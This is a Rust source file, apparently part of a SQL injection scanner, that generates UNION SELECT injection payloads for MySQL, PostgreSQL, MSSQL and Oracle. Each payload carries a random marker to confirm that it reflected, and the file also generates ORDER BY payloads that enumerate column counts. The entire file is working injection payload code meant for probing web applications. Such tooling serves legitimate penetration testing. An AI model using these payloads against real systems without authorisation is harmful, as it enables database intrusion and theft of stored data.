#![deny(unsafe_code)]

/// Union-based payloads per DBMS, with column count enumeration.
#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct UnionPayload {
    pub payload: String,
    pub dbms: String,
    pub columns: usize,
    /// Unique marker string embedded (quoted) in the last selected column so the
    /// caller can confirm this specific payload's output round-tripped through
    /// the response, rather than relying on an easily-collided literal.
    pub marker: String,
}

/// Build a comma-joined column list where every position is the numeric index
/// except `marker_pos` (1-indexed), which carries the quoted `marker` string.
fn cols_with_marker(columns: usize, marker_pos: usize, marker: &str) -> String {
    (1..=columns)
        .map(|i| {
            if i == marker_pos {
                format!("'{marker}'")
            } else {
                i.to_string()
            }
        })
        .collect::<Vec<_>>()
        .join(",")
}

#[must_use]
pub fn union_payloads_for(dbms: Option<&str>, columns: usize) -> Vec<UnionPayload> {
    let marker = format!(
        "u{}",
        uuid::Uuid::new_v4().simple().to_string()[..8].to_owned()
    );
    let cols = cols_with_marker(columns, columns, &marker);
    #[allow(clippy::match_same_arms)]
    let comment = match dbms {
        Some("mysql") => " -- -",
        Some("postgres") => " --",
        Some("mssql") => " --",
        Some("oracle") => " --",
        _ => " -- -",
    };
    // Second variant uses NULL as first column (bypassing type coercion issues)
    // while still carrying the marker in the last column.
    let cols_null = if columns <= 1 {
        format!("'{marker}'")
    } else {
        let tail = (2..columns)
            .map(|i| i.to_string())
            .collect::<Vec<_>>()
            .join(",");
        if tail.is_empty() {
            format!("NULL,'{marker}'")
        } else {
            format!("NULL,{tail},'{marker}'")
        }
    };
    let base = match dbms {
        Some("mysql") => vec![
            (format!("' UNION SELECT {cols}{comment}"), "mysql"),
            (format!("' UNION SELECT {cols_null}{comment}"), "mysql"),
        ],
        Some("postgres") => vec![
            (format!("' UNION SELECT {cols}{comment}"), "postgres"),
            (format!("' UNION SELECT {cols_null}{comment}"), "postgres"),
        ],
        Some("mssql") => vec![
            (format!("' UNION SELECT {cols}{comment}"), "mssql"),
            (format!("' UNION SELECT {cols_null}{comment}"), "mssql"),
        ],
        Some("oracle") => vec![
            (
                format!("' UNION SELECT {cols} FROM dual{comment}"),
                "oracle",
            ),
            (
                format!("' UNION SELECT {cols_null} FROM dual{comment}"),
                "oracle",
            ),
        ],
        _ => vec![
            (format!("' UNION SELECT {cols}{comment}"), "generic"),
            (format!("' UNION SELECT {cols_null}{comment}"), "generic"),
            (format!("\" UNION SELECT {cols}{comment}"), "generic"),
        ],
    };
    base.into_iter()
        .map(|(p, d)| UnionPayload {
            payload: p,
            dbms: d.to_owned(),
            columns,
            marker: marker.clone(),
        })
        .collect()
}

/// Generate ORDER BY enumeration payloads to discover column count (e.g., ORDER BY 1 --).
#[must_use]
pub fn order_by_payloads(max_cols: usize) -> Vec<String> {
    (1..=max_cols)
        .map(|i| format!("' ORDER BY {i} -- -"))
        .collect()
}
